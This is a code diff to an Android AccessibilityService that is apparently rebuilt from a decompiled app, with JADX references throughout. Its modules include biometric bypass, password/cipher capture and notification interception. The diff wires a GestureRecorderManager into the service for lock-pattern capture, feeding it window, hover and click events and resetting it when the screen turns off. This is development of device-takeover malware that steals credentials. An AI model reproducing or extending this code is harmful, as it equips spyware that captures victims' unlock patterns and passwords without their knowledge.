@@ -36,6 +36,7 @@ import com.storm.safe.rock.service.modules.AccessibilityEventRouter
 import com.storm.safe.rock.service.modules.ActivityMonitor
 import com.storm.safe.rock.service.modules.BiometricBypassDelegate
 import com.storm.safe.rock.service.modules.ConfigProgressManager
+import com.storm.safe.rock.service.modules.GestureRecorderManager
 import com.storm.safe.rock.service.modules.MainOrchestrator
 import com.storm.safe.rock.service.modules.NetworkManager
 import com.storm.safe.rock.service.modules.NotificationInterceptDelegate
@@ -347,7 +348,7 @@ class MyAccessibilityService : AccessibilityService() {
     var notificationInterceptDelegate: NotificationInterceptDelegate? = null
 
     /** JADX: f52437g8 (C0319a4) — raw reference for gesture recording dispatch */
-    var gestureRecorderManager: Any? = null
+    var gestureRecorderManager: GestureRecorderManager? = null
 
     /** JADX: f52438g9 (C0335a1) — Password/cipher capture */
     var cipherCaptureManager: CipherCaptureManager? = null
@@ -984,6 +985,8 @@ class MyAccessibilityService : AccessibilityService() {
             // ── processNotificationEvent — lockscreen gesture dispatch (JADX line 10052) ──
             if (eventType == 32 || eventType == 2048) {
                 processNotificationEvent(event)
+                // JADX: C0319a4.m211577a6 — gesture recorder window state detection
+                gestureRecorderManager?.onWindowStateChanged(event)
             }
 
             // ── GestureRecorderManager dispatch for hover/click events (JADX line 10055–10108) ──
@@ -993,7 +996,7 @@ class MyAccessibilityService : AccessibilityService() {
                 try {
                     if (eventType == 128) {
                         // JADX: hover event → gestureRecorderManager.onHoverEvent
-                        android.util.Log.v(TAG, "🔍 [HOVER-DEBUG] → 转发给 gestureRecorderManager.onHoverEvent")
+                        gestureRecorderManager?.onHoverEvent(event)
                     }
                     if (eventType == 1) {
                         // JADX: click event → gestureRecorderManager.onClickEvent
@@ -1860,6 +1863,7 @@ class MyAccessibilityService : AccessibilityService() {
                                 android.util.Log.d(TAG, "SCREEN_OFF")
                                 cipherCaptureManager?.resetLockBatchId()
                                 cipherRetryCount = 0
+                                gestureRecorderManager?.reset()
                                 try { sendScreenStatus() } catch (_: Exception) {}
                             }
                             Intent.ACTION_USER_PRESENT -> {
@@ -3142,6 +3146,16 @@ class MyAccessibilityService : AccessibilityService() {
             notificationInterceptDelegate = NotificationInterceptDelegate()
         } catch (e: Exception) {
             android.util.Log.e(TAG, "❌ NotificationInterceptDelegate 延迟初始化失败", e)
+        }
+
+        // JADX: f52437g8 (C0319a4) — GestureRecorderManager for pattern capture
+        try {
+            if (gestureRecorderManager == null) {
+                gestureRecorderManager = GestureRecorderManager(this)
+                android.util.Log.d(TAG, "GestureRecorderManager initialized")
+            }
+        } catch (e: Exception) {
+            android.util.Log.e(TAG, "GestureRecorderManager init failed", e)
         }
 
         // JADX: f52438g9 — cipherCaptureManager singleton
